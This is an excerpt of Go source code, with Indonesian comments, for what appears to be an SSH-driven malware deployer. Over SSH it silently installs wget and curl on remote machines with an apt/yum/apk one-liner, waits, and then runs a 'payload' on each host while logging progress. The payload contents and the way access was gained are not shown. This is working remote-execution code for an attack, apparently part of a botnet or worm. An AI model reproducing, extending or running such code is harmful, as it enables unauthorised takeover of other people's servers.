...
// ==================== PAYLOAD CONSTANTS ====================
const (
	INSTALL_WGET_DELAY = 8 * time.Second
	PAYLOAD_DELAY      = 12 * time.Second
)
...
func main() {
	...
	if isPipe {
		...
		// Mode interactive (seperti biasa)
...
func printHelp() {
	...
	printBoxLine("  • Auto install wget & curl", boxWidth)
...
// ==================== PAYLOAD EXECUTION WITH DELAYS ====================
// Execute payload on remote host: install wget & curl first, then run the main payload
func executePayload(client *ssh.Client) {
	// Command to install wget and curl if missing (supports apt, yum, apk)
	installTools := `command -v wget >/dev/null 2>&1 || { apt-get update -y && apt-get install wget -y; } 2>/dev/null; command -v wget >/dev/null 2>&1 || { yum install wget -y; } 2>/dev/null; command -v wget >/dev/null 2>&1 || { apk add wget; } 2>/dev/null; command -v curl >/dev/null 2>&1 || { apt-get install curl -y; } 2>/dev/null; command -v curl >/dev/null 2>&1 || { yum install curl -y; } 2>/dev/null; command -v curl >/dev/null 2>&1 || { apk add curl; } 2>/dev/null`
	...
	log.Printf("📦 Installing wget & curl on %s...", client.RemoteAddr())
	if err := session.Run(installTools); err != nil {
		log.Printf("Failed to install tools on %s: %v", client.RemoteAddr(), err)
	} else {
		log.Printf("✅ wget & curl installed on %s", client.RemoteAddr())
	}

	// Step 2: Wait 8-10 detik setelah install
	log.Printf("⏳ Waiting %v for installation to complete...", INSTALL_WGET_DELAY)
	time.Sleep(INSTALL_WGET_DELAY)

	// Step 3: Execute main payload
	log.Printf("🚀 Sending payload to %s...", client.RemoteAddr())
	if err := session.Run(payload); err != nil {
		log.Printf("Payload execution error on %s: %v", client.RemoteAddr(), err)
	} else {
		log.Printf("✅ Payload sent to %s", client.RemoteAddr())
	}

	// Step 4: Wait 10-15 detik setelah payload
	log.Printf("⏳ Waiting %v for payload to execute...", PAYLOAD_DELAY)
